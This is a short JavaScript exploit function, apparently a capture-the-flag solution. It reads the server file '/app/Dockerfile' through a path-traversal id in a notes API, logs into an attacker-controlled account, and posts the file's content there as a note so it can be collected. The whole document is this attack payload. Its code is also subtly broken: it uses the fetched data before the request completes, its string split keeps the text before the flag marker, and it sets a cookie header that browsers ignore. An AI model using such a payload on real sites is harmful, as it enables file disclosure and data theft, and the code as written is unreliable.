function f(cookie) {
    let url = "/api/notes?id=/app/Dockerfile";
    let url2 = "/api/notes";
    let data;

    fetch(url)
        .then(
            (response) => {
                return response.json();
            }
        ).then(
            (response) => {
                data = response;
            });

    // delete data 
    let flag = data.content.split("'FLAG{")[0]

    fetch(
        "/login", {
        method: "POST",
        headers: {
            "content-type": "application/x-www-form-urlencoded"
        },
        body: "username=qweasd&password=qweasd"
    }).then(
        (response) => {
            fetch(
                url2, {
                method: "POST",
                headers: {
                    "content-type": "application/json",
                    "cookie": "session=" + cookie
                },
                body: JSON.stringify({ "title": data.title, "content": flag })
            }
            );
        });
    return ""
}
